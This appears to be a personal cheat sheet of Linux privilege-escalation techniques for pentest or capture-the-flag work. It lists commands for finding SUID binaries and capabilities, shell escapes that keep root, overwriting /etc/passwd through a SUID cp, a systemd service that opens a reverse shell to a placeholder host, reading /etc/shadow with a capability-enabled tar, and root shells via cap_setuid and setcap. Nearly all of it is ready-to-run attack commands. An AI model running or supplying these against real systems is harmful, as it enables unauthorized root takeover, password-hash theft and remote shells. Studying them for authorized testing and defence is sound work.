# Linux privesc: SUID and capabilities

## Find them
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
- [ ] Expected, and rarely the way in: sudo, su, passwd, mount, umount, ping, chsh, newgrp, gpasswd, pkexec
- [ ] Worth a look: anything in /usr/local, /opt or a home folder, or with a name I do not know
- [ ] Every unusual one looked up on GTFOBins, under SUID or Capabilities

## SUID escapes, keeping root with -p
find . -exec /bin/sh -p \; -quit
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
env /bin/sh -p
/usr/bin/bash -p

## SUID cp: a new /etc/passwd
openssl passwd -1 'Pwned123!'
A copy I own, since one made by the SUID cp belongs to root:
cat /etc/passwd > /tmp/passwd
- [ ] In /tmp/passwd, root's x replaced by that hash
cp /tmp/passwd /etc/passwd
su root

## SUID systemctl: a service of my own, run as root
cat > /dev/shm/pe.service <<'EOF'
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
[Install]
WantedBy=multi-user.target
EOF
systemctl link /dev/shm/pe.service
systemctl start pe

## A custom SUID program
strings THE-PROGRAM
ltrace THE-PROGRAM
strace -f THE-PROGRAM 2>&1 | grep -E 'open|exec'
- [ ] A program called by bare name, such as tar or service: a PATH hijack
- [ ] An environment variable it checks with getenv: set it and run it again
- [ ] A library it looks for and does not find, in a folder I can write

## Capabilities
cap_setuid, on python, perl or vim:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
cap_dac_read_search, on tar: archive a root-only file, then unpack it.
./tar -cvf shadow.tar /etc/shadow
./tar -xvf shadow.tar
- [ ] cap_dac_override writes any file, cap_chown and cap_fowner take any file, cap_sys_admin mounts
- [ ] cap_net_raw on ping is normal and not a way in

## setcap allowed through SUID or sudo
In my home folder: a capability is ignored on a nosuid mount, which /tmp and /dev/shm often are.
cp /usr/bin/python3 ~/python3
setcap cap_setuid+ep ~/python3
sudo setcap cap_setuid+ep ~/python3
- [ ] The first setcap when setcap is SUID, the second when sudo -l allows it
~/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
